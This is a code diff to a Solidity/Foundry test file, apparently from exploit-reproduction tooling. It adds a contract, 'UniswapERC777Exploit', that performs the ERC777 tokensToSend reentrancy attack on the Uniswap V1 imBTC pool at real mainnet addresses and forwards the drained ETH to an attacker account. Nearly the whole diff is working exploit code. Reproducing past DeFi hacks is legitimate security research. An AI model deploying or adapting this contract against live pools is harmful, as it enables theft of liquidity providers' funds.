@@ -65,3 +65,50 @@ contract ContractTest is Test {
 
     receive() external payable {}
 }
+
+// EVM-PoC wrapper: same ERC777 tokensToSend reentrancy as ContractTest, but
+// deployed + funded by the recorder and forwarding the drained ETH back to its
+// `owner` (the attacker EOA) so profit is measurable on the attacker's balance.
+contract UniswapERC777Exploit {
+    UniswapV1 constant uniswapv1 = UniswapV1(0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187);
+    IERC777 constant imbtc = IERC777(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
+    address public owner;
+    uint256 i = 0;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    function attack() external {
+        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
+            address(this), keccak256("ERC777TokensSender"), address(this)
+        );
+        // Buy imBTC with 1 ETH of working capital (funded by the recorder setup).
+        uniswapv1.ethToTokenSwapInput{value: 1 ether}(
+            1, 115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
+        );
+        imbtc.approve(address(uniswapv1), 10_000_000);
+        // Sell 823,084 imBTC; the tokensToSend hook below re-enters a second,
+        // stale-reserve-priced sell before this one's transferFrom settles.
+        uniswapv1.tokenToEthSwapInput(
+            823_084,
+            1,
+            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
+        );
+        // Forward all drained ETH to the attacker EOA.
+        payable(owner).transfer(address(this).balance);
+    }
+
+    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
+        if (i < 1) {
+            i++;
+            uniswapv1.tokenToEthSwapInput(
+                823_084,
+                1,
+                115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
+            );
+        }
+    }
+
+    receive() external payable {}
+}
